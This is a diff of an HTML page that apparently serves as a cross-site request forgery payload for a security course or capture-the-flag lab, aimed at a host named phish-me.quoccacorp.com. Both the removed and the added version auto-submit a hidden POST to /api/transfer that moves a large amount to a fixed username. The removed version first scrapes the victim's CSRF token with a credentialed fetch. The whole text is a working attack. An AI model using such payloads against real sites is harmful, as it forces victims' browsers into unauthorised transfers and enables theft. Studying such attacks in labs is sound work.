@@ -1,21 +1,10 @@
 <html>
 <body>
-<script>
-fetch('https://phish-me.quoccacorp.com/', {credentials: 'include'})
-  .then(r => r.text())
-  .then(html => {
-    const token = html.match(/csrf_token" value="([^"]+)"/)[1];
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://phish-me.quoccacorp.com/api/transfer';
-    form.innerHTML = `
-      <input name="csrf_token" value="${token}">
-      <input name="username" value="z5626137">
-      <input name="amount" value="99999">
-    `;
-    document.body.appendChild(form);
-    form.submit();
-  });
-</script>
+<form id="f" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+  <input name="csrf_token" value="MTE1OQ==">
+  <input name="username" value="z5626137">
+  <input name="amount" value="10000">
+</form>
+<script>document.getElementById('f').submit()</script>
 </body>
 </html>
